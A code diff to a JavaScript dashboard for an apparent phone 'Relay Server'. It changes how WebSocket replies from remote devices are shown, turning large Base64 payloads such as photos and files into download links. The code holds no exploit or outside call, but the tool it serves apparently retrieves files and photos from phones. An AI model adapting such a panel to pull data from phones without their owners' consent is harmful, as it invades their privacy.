@@ -37,64 +37,63 @@ function connectWebSocket() {
     };
 
     ws.onmessage = function (event) {
-        try {
-            const data = JSON.parse(event.data);
+    try {
+        const data = JSON.parse(event.data);
 
-            // --- AUTH RESULT: must be handled first, or the dashboard
-            // never unlocks even when the password is correct ---
-            if (data.type === 'auth_result') {
-                loginBtn.disabled = false;
-                if (data.ok) {
-                    authenticated = true;
-                    loginSection.style.display = 'none';
-                    dashboardSection.style.display = 'block';
-                    statusEl.textContent = 'Connected';
-                    statusEl.className = 'connected';
-                    addMessage('Connected to Relay Server');
-                } else {
-                    loginError.style.display = 'block';
-                }
-                return;
+        // --- AUTH RESULT ---
+        if (data.type === 'auth_result') {
+            loginBtn.disabled = false;
+            if (data.ok) {
+                authenticated = true;
+                loginSection.style.display = 'none';
+                dashboardSection.style.display = 'block';
+                statusEl.textContent = 'Connected';
+                statusEl.className = 'connected';
+                addMessage('Connected to Relay Server');
+            } else {
+                loginError.style.display = 'block';
             }
-
-            // --- CHECK IF IT'S A HUGE IMAGE DOWNLOAD ---
-            if (data.type === "phone_response" && data.data && typeof data.data === "string" && data.data.length > 200000) {
-                // It's a large Base64 string (photo/video)
-                const base64String = data.data;
-
-                // Create a download link
-                const link = document.createElement('a');
-                link.href = 'data:image/jpeg;base64,' + base64String;
-                link.download = 'downloaded_photo.jpg';
-                link.textContent = '📸 Click here to download the photo (Right-click -> Save As)';
-                link.style.display = 'block';
-                link.style.margin = '10px 0';
-                link.style.padding = '10px';
-                link.style.background = '#28a745';
-                link.style.color = 'white';
-                link.style.borderRadius = '5px';
-                link.style.textAlign = 'center';
-                link.style.textDecoration = 'none';
-
-                messagesEl.appendChild(link);
-                messagesEl.scrollTop = messagesEl.scrollHeight;
-                return; // Stop here, don't print the raw text
-            }
-
-            // --- FOR SMALL TEXTS (PING, STATUS, FILES LIST) ---
-            let displayText = event.data;
-            if (data.type === "phone_response") {
-                // If data.data is an object, stringify it; otherwise use it as-is.
-                const responseText = typeof data.data === 'string' ? data.data : JSON.stringify(data.data, null, 2);
-                displayText = `[${data.deviceId}] ${responseText}`;
-            }
-            addMessage(displayText);
-
-        } catch (e) {
-            // If it's not JSON, just print it as-is
-            addMessage(event.data);
+            return;
         }
-    };
+
+        // --- DOWNLOAD DETECTION (any long Base64 string) ---
+        // If it's a "phone_response" and data.data is a long string (>1000 chars)
+        if (data.type === "phone_response" && data.data && typeof data.data === "string" && data.data.length > 1000) {
+            const base64String = data.data;
+
+            // Create a download link (generic binary)
+            const link = document.createElement('a');
+            link.href = 'data:application/octet-stream;base64,' + base64String;
+            // Try to infer a filename from the command? We don't have it, so use a timestamp.
+            link.download = 'downloaded_file_' + Date.now() + '.bin';
+            link.textContent = '📥 Click to download the file (' + (base64String.length * 0.75 / 1024).toFixed(1) + ' KB)';
+            link.style.display = 'block';
+            link.style.margin = '10px 0';
+            link.style.padding = '10px';
+            link.style.background = '#28a745';
+            link.style.color = 'white';
+            link.style.borderRadius = '5px';
+            link.style.textAlign = 'center';
+            link.style.textDecoration = 'none';
+
+            messagesEl.appendChild(link);
+            messagesEl.scrollTop = messagesEl.scrollHeight;
+            return; // Do not print the raw text
+        }
+
+        // --- NORMAL TEXT RESPONSES ---
+        let displayText = event.data;
+        if (data.type === "phone_response") {
+            const responseText = typeof data.data === 'string' ? data.data : JSON.stringify(data.data, null, 2);
+            displayText = `[${data.deviceId}] ${responseText}`;
+        }
+        addMessage(displayText);
+
+    } catch (e) {
+        // Fallback for non-JSON messages
+        addMessage(event.data);
+    }
+};
 
     ws.onclose = () => {
         loginBtn.disabled = false;
